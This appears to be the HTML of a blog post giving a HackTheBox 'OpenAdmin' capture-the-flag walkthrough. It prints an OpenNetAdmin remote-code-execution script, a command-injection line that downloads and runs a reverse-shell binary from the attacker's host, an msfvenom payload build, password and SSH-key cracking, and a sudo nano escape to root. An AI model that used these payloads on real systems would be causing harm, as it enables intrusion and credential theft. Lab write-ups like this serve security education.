<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>OpenAdmin | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="OpenAdmin HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/openadmin/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/openadmin/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="OpenAdmin "><meta property="og:description" content="OpenAdmin HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/openadmin/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/openadmin/openadmin.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-05-01T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/openadmin/openadmin.png"><meta name=twitter:title content="OpenAdmin "><meta name=twitter:description content="OpenAdmin HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"OpenAdmin ","item":"https://s4ch.github.io/writeups/hackthebox/openadmin/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"OpenAdmin ","name":"OpenAdmin ","description":"OpenAdmin HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"≡ƒÆó Info Name: OpenAdmin Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview Network Enumeration: port 80, 22 Web Application Enumeration: find /ona/ Web Application Exploitation: OpenNetAdmin RCE System enumeration and exploration in the jungle: mysql creds + 127.0.0.1:52846 System Privilege Escalation : www-data to jimmy: credential stuffing System Privilege Escalation : jimmy to joanna: password crack System Privilege Escalation : joanna to root: nano escape Network Enumeration TL;DR: port 80, 22\nLet’s begin by finding open ports with a SYN nmap scan and then trying to run default scripts and finding the version of those services.\n$ sudo nmap -p- -sS 10.10.10.171 -oA nmap_ports [sudo] password for cyfun: Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 10:45 CET Nmap scan report for 10.10.10.171 Host is up (0.025s latency). Not shown: 65533 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 31.23 seconds $ sudo nmap -p 80,22 -sSCV 10.10.10.171 -oA nmap_services Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 10:46 CET Nmap scan report for 10.10.10.171 Host is up (0.024s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds As often, only a web app.\nWeb Application Enumeration TL;DR: find /ona/\nWith a web directory finder like dirsearch or ffuf and a good wordlist, we can try to enumerate the possible sub-folders.\n[14:04:59] 301 - 312B - /music -\u003e http://10.10.10.171/music/ [14:05:01] 301 - 314B - /artwork -\u003e http://10.10.10.171/artwork/ [14:05:04] 403 - 277B - /server-status [14:05:13] 301 - 313B - /sierra -\u003e http://10.10.10.171/sierra/ Many rabbit hole sub-directories but on http://10.10.10.171/music/ there is a login button leading to http://10.10.10.171/ona/ where is hosted an OpenNetAdmin v18.1.1 instance.\nWe can see an alert message telling there is a newer version available and that we have version 18.1.1 of OpenNetAdmin.\nWeb Application Exploitation TL;DR: OpenNetAdmin RCE\nWith the Exploit-DB tool searchsploit we search if there are available exploits.\nsearchsploit OpenNetAdmin shows there is a RCE for 18.1.1.\nNote: I got some error with the exploit that was due to the EOL char, I copied the exploit and converted CRLF to LF.\nWe just have to give the login URL to the exploit to get a pseudo-shell.\nbash 47691.sh http://10.10.10.171/ona/login.php $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) System enumeration and exploration in the jungle TL;DR: mysql creds + 127.0.0.1:52846\nLet’s try some basic commands and see if we can find something juicy.\n$ pwd /opt/ona/www $ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false joanna:x:1001:1001:,,,:/home/joanna:/bin/bash $ uname -a Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux At some point I ran linpeas.sh (from PEASS suite) and found there was not only /opt/ona/www related to OpenNetAdmin but also /var/www/html/ona.\nIn there are the database credentials.\n$ cat /var/www/html/ona/local/config/database_settings.inc.php \u003c?php $ona_contexts=array ( 'DEFAULT' =\u003e array ( 'databases' =\u003e array ( 0 =\u003e array ( 'db_type' =\u003e 'mysqli', 'db_host' =\u003e 'localhost', 'db_login' =\u003e 'ona_sys', 'db_passwd' =\u003e 'n1nj4W4rri0R!', 'db_database' =\u003e 'ona_default', 'db_debug' =\u003e false, ), ), 'description' =\u003e 'Default data context', 'context_color' =\u003e '#D3DBFF', ), ); At some point I got bored of the pseudo-shell via the RCE exploit so I decided to get a meterpreter reverse shell. A better reason is that we can’t use interactive client such a mysql client from the RCE so we need a real shell.\nThe RCE exploit is pretty simple:\n#!/bin/bash URL=\"${1}\" while true;do echo -n \"$ \"; read cmd curl --silent -d \"xajax=window_submit\u0026xajaxr=1574117726710\u0026xajaxargs[]=tooltips\u0026xajaxargs[]=ip%3D%3E;echo \\\"BEGIN\\\";${cmd};echo \\\"END\\\"\u0026xajaxargs[]=ping\" \"${URL}\" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 done So to upload an execute my reverse shell I tried:\ncurl --silent -d \"xajax=window_submit\u0026xajaxr=1574117726710\u0026xajaxargs[]=tooltips\u0026xajaxargs[]=ip%3D%3E;echo \\\"BEGIN\\\";wget http://10.10.15.151:443/80.bin; chmod +x 80.bin; ./80.bin ;echo \\\"END\\\"\u0026xajaxargs[]=ping\" \"http://10.10.10.171/ona/login.php\" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1 The shell wasn’t executed because we can’t chmod +x for whatever reason.\nSo I tried a trick to execute the shell: /lib64/ld-linux-x86-64.so.2 /opt/ona/www/80.bin but it didn’t work.\nI found a quite useful article What can you do when you can’t chmod chmod? were I learned about a command to copy the permissions of a binary.\nSo I used getfacl and setfacl to copy permissions from another binary.\ngetfacl /bin/ls | setfacl --set-file=- 80.bin It seems Meterpreter has an upstream bug with shell.\nSo in short here what I did to get my reverse shell:\n# Attacker msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.151 LPORT=80 -f elf \u003e 80.bin # Target wget http://10.10.15.151:443/80.bin getfacl /bin/ls | setfacl --set-file=- 80.bin ./80.bin Listener + PTY:\nmsf5 \u003e use exploit/multi/handler msf5 exploit(multi/handler) \u003e set payload linux/x64/shell_reverse_tcp payload =\u003e linux/x64/shell_reverse_tcp msf5 exploit(multi/handler) \u003e set LPORT 80 LPORT =\u003e 80 msf5 exploit(multi/handler) \u003e set LHOST 10.10.15.151 LHOST =\u003e 10.10.15.151 msf5 exploit(multi/handler) \u003e run python3 -c 'import pty;pty.spawn(\"/bin/bash\")' Now we can use the interactive mysql client with the credentials we looted earlier:\nwww-data@openadmin:/opt/ona/www$ mysql -u ona_sys -p mysql\u003e show tables; show tables; +------------------------+ | Tables_in_ona_default | +------------------------+ | blocks | | configuration_types | | configurations | | custom_attribute_types | | custom_attributes | | dcm_module_list | | device_types | | devices | | dhcp_failover_groups | | dhcp_option_entries | | dhcp_options | | dhcp_pools | | dhcp_server_subnets | | dns | | dns_server_domains | | dns_views | | domains | | group_assignments | | groups | | host_roles | | hosts | | interface_clusters | | interfaces | | locations | | manufacturers | | messages | | models | | ona_logs | | permission_assignments | | permissions | | roles | | sequences | | sessions | | subnet_types | | subnets | | sys_config | | tags | | users | | vlan_campuses | | vlans | +------------------------+ 40 rows in set (0.00 sec) mysql\u003e select * from users; select * from users; +----+----------+----------------------------------+-------+---------------------+---------------------+ | id | username | password | level | ctime | atime | +----+----------+----------------------------------+-------+---------------------+---------------------+ | 1 | guest | 098f6bcd4621d373cade4e832627b4f6 | 0 | 2020-03-13 15:46:03 | 2020-03-13 15:46:03 | | 2 | admin | 21232f297a57a5a743894a0e4a801fc3 | 0 | 2020-03-13 15:45:04 | 2020-03-13 15:45:04 | +----+----------+----------------------------------+-------+---------------------+---------------------+ 2 rows in set (0.00 sec) All of that was nearly useless because the password hash of the admin user is the md5 of admin so we could have guessed it pretty easily.\nWith ss -nlp let list open sockets:\ntcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:52846 0.0.0.0:* tcp LISTEN 0 128 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 14 128 *:80 *:* tcp LISTEN 0 128 [::]:22 [::]:* We can see the public web server listening on all interfaces on port 80, the SSH server, the internally exposed database on port 3306, but what’s running on port 52846? Seems it’s a web server.\nThe body looks like this:\n\u003cbody\u003e \u003ch2\u003eEnter Username and Password\u003c/h2\u003e \u003cdiv class = \"container form-signin\"\u003e \u003ch2 class=\"featurette-heading\"\u003eLogin Restricted.\u003cspan class=\"text-muted\"\u003e\u003c/span\u003e\u003c/h2\u003e \u003c/div\u003e \u003cdiv class = \"container\"\u003e \u003cform class = \"form-signin\" role = \"form\" action = \"/index.php\" method = \"post\"\u003e \u003ch4 class = \"form-signin-heading\"\u003e\u003c/h4\u003e \u003cinput type = \"text\" class = \"form-control\" name = \"username\" required autofocus\u003e\u003c/br\u003e \u003cinput type = \"password\" class = \"form-control\" name = \"password\" required\u003e \u003cbutton class = \"btn btn-lg btn-primary btn-block\" type = \"submit\" name = \"login\"\u003eLogin\u003c/button\u003e \u003c/form\u003e \u003c/div\u003e \u003c/body\u003e There is a login page on 127.0.0.1:52846, let’s try to login with the creds we found on the database.\ncurl -X POST http://127.0.0.1:52846/index.php --data 'username=admin\u0026password=admin\u0026login=Submit' I obtain a Wrong username or password. :(\nBut if take a look at the owner of the internal website, it seems it’s jimmy:\nwww-data@openadmin:/var/www$ ls -lh ls -lh total 8.0K drwxr-xr-x 6 www-data www-data 4.0K Nov 22 15:59 html drwxrwx--- 2 jimmy internal 4.0K Mar 13 15:53 internal lrwxrwxrwx 1 www-data www-data 12 Nov 21 16:07 ona -\u003e /opt/ona/www System Privilege Escalation : www-data to jimmy TL;DR: credential stuffing\nIt could be helpful to read the source code but with www-data we are not in the internal group so we need to connect as jimmy to read the source code.\nA big guessing step involved here: we needed to re-use the MySQL ona_sys user password (n1nj4W4rri0R!) as jimmy PAM password for ssh. I think the idea was credentials stuffing if jimmy is the dev of the internal web app he may have reused his own personal password for dev purpose like the DB.\nNow cen can connect and look at the source code:\n$ ssh jimmy@10.10.10.171 jimmy@openadmin:~$ ls -la /var/www/internal/ total 20 drwxrwx--- 2 jimmy internal 4096 Mar 13 15:53 . drwxr-xr-x 4 root root 4096 Nov 22 18:15 .. -rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php -rwxrwxr-x 1 jimmy internal 185 Nov 23 16:37 logout.php lrwxrwxrwx 1 jimmy jimmy 17 Mar 13 15:53 lol -\u003e /var/www/html/lol -rwxrwxr-x 1 jimmy internal 339 Nov 23 17:40 main.php In index.php\n\u003c?php $msg = ''; if (isset($_POST['login']) \u0026\u0026 !empty($_POST['username']) \u0026\u0026 !empty($_POST['password'])) { if ($_POST['username'] == 'jimmy' \u0026\u0026 hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') { $_SESSION['username'] = 'jimmy'; header(\"Location: /main.php\"); } else { $msg = 'Wrong username or password.'; } } ?\u003e The password of jimmy (for the internal web app) is hardcoded and we can break the SHA512 with an online service for example.\n00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1 -\u003e Revealed\nSo we can connect as jimmy and be redirected to main.php (header(\"Location: /main.php\");).\nSystem Privilege Escalation : jimmy to joanna TL;DR: password crack\n$ curl -X POST http://127.0.0.1:52846/index.php --data 'username=jimmy\u0026password=Revealed\u0026login=Submit' $ curl -X POST http://127.0.0.1:52846/main.php -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8 ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE 6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI 9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4 piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/ /U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH 40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb 9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80 X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr 1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2 XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79 yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM +4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN -----END RSA PRIVATE KEY----- uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal) Don't forget your \"ninja\" password Click here to logout Session We could also have look at main.php directly on the file system too but I wanted to follow the application logic.\nIt seems we have a private key from joanna user, which is encrypted and password protected but we also have a hint to crack it: Don’t forget your “ninja” password.\nLet’s crack it with JtR (John the Ripper):\n$ ssh2john id_rsa /usr/bin/ssh2john:103: DeprecationWarning: decodestring() is a deprecated alias since Python 3.1, use decodebytes() data = base64.decodestring(data) id_rsa:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d $ john --wordlist=/usr/share/wordlists/password/rockyou.txt john.txt Warning: detected hash type \"SSH\", but the string is also recognized as \"ssh-opencl\" Use the \"--format=ssh-opencl\" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status bloodninjas (id_rsa) Warning: Only 1 candidate left, minimum 2 needed for performance. 1g 0:00:00:08 DONE (2020-03-13 17:35) 0.1237g/s 1774Kp/s 1774Kc/s 1774KC/s *7┬íVamos! Session completed The password is bloodninjas to unlock the private key of joanna.\nWe can connect now.\nSystem Privilege Escalation : joanna to root TL;DR: nano escape\n$ ssh joanna@10.10.10.171 -i id_rsa joanna@openadmin:~$ cat user.txt c9b2cf07d40807e62af62660f0c81b5f $ sudo -l Matching Defaults entries for joanna on openadmin: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/priv EZ pe: escape nano thanks to GTFObins\nSee https://gtfobins.github.io/gtfobins/nano/.\n# cat /root/root.txt 2f907ed450b361b2c2bf4e8795d5b561 ","wordCount":"1974","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/openadmin/openadmin.png","datePublished":"2020-05-01T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/openadmin/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">OpenAdmin</h1><div class=post-description>OpenAdmin HackTheBox writeup</div><div class=post-meta>&lt;span title='2020-05-01 00:00:00 +0000 UTC'>May 1, 2020&lt;/span>&amp;nbsp;·&amp;nbsp;10 min&amp;nbsp;·&amp;nbsp;1974 words&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/tags/ctf/" class="post-tag" title="ctf">ctf&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/hackthebox/" class="post-tag" title="hackthebox">hackthebox&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/penetration-testing/" class="post-tag" title="penetration-testing">penetration-testing&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/writeup/" class="post-tag" title="writeup">writeup&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/linux/" class="post-tag" title="linux">linux&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/easy/" class="post-tag" title="easy">easy&lt;/a>
&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/categories/writeups/" class="post-tag" title="writeups">writeups&lt;/a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/openadmin/openadmin.png alt="OpenAdmin HackTheBox Machine"><p>OpenAdmin - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network Enumeration</a></li><li><a href=#web-application-enumeration>Web Application Enumeration</a></li><li><a href=#web-application-exploitation>Web Application Exploitation</a></li><li><a href=#system-enumeration-and-exploration-in-the-jungle>System enumeration and exploration in the jungle</a></li><li><a href=#system-privilege-escalation--www-data-to-jimmy>System Privilege Escalation : www-data to jimmy</a></li><li><a href=#system-privilege-escalation--jimmy-to-joanna>System Privilege Escalation : jimmy to joanna</a></li><li><a href=#system-privilege-escalation--joanna-to-root>System Privilege Escalation : joanna to root</a></li></ul></li></ul></nav></div></details></div><div 